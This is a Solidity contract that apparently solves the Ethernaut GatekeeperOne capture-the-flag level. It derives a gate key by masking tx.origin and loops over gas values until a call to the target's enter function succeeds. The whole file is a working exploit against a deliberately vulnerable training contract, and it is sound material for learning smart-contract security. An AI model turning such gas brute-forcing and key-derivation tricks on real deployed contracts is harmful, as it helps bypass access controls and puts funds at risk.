// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

contract Solver {
    function solve(address _target) external {
        bytes8 gateKey = bytes8(
            uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF
        );

        for (uint256 i = 0; i < 300; i++) {
            (bool success, ) = _target.call{gas: i + (8191 * 3)}(
                abi.encodeCall(GatekeeperOne.enter, (gateKey))
            );

            if (success) break;
        }
    }
}